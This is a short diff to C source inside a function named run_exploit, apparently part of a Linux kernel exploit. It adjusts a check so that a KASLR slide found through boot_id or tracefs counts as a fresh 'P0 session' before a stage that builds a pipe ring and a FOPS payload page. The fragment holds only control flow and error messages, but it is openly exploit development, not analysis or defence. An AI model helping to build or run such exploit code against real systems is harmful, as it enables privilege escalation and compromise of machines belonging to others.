@@ -452,11 +452,24 @@ int run_exploit(int argc, char **argv) {
     return 0;
   }
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+#if defined(APP_SLIDE_NOPHYS_ROUTE) && APP_SLIDE_NOPHYS_ROUTE
+  /* v18/v19 (kp16/kp17): a non-physical slide (boot_id or tracefs) carries
+   * no P0 state; the FOPS stage below builds its own fresh P0 session
+   * in-process (fresh pipe ring + fresh FOPS payload page), so a
+   * non-physical slide satisfies the fresh-session requirement by
+   * construction. */
+  if (!slide_p0_session_fresh && !slide_bootid_slide_done) {
+    pr_error("full route requires P0 discovery in the current exploit process; "
+             "refusing forced or retained cross-process slide\n");
+    return 1;
+  }
+#else
   if (!slide_p0_session_fresh) {
     pr_error("full route requires P0 discovery in the current exploit process; "
              "refusing forced or retained cross-process slide\n");
     return 1;
   }
+#endif
 #endif
 
 #if defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
